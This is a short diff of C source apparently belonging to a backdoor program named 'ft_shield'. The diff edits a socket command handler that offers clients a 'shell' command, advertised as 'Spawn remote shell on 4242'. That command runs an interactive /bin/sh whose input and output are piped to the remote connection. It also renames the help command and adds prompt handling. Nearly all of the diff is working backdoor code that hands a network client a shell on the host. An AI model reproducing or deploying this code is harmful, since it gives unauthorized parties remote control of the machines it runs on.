@@ -1,8 +1,8 @@
 #include "ft_shield.h"
 
 void shell(t_server *server, int fd, char *msg) {
-	if (strcmp(msg, "help") == 0) {
-		if(send(fd, "shell Spawn remote shell on 4242\n$> ", strlen("shell Spawn remote shell on 4242\n$> "), 0) < 0) {
+	if (strcmp(msg, "?") == 0) {
+		if(send(fd, "? show help\nshell Spawn remote shell on 4242\n$> ", strlen("? show help\nshell Spawn remote shell on 4242\n$> "), 0) < 0) {
 			remove_client(server, fd);
 			fprintf(stderr, "Failed to send the response to the client\n");
 		}
@@ -44,7 +44,11 @@ void shell(t_server *server, int fd, char *msg) {
 				dup2(input[0], 0);
 				dup2(output[1], 1);
 				dup2(output[1], 2);
-				execlp("/bin/sh", "sh", "+m", "-i", NULL);
+				char *envp[] = {
+					"TERM=xterm-256color",
+					NULL
+				};
+				execle("/bin/sh", "sh", "-i", "+m", NULL, envp);
 				exit(0);
 			}
 			close(input[0]);
@@ -70,6 +74,12 @@ void shell(t_server *server, int fd, char *msg) {
 		}
 		client->shell_fd = input[1];
 		close(input[0]);
+	}
+	else if (strcmp(msg, "") == 0) {
+		if(send(fd, "$> ", strlen("$> "), 0) < 0) {
+			remove_client(server, fd);
+			fprintf(stderr, "Failed to send the response to the client\n");
+		}
 	}
 	else {
 		if(send(fd, "Unknown command!\n$> ", strlen("Unknown command!\n$> "), 0) < 0) {
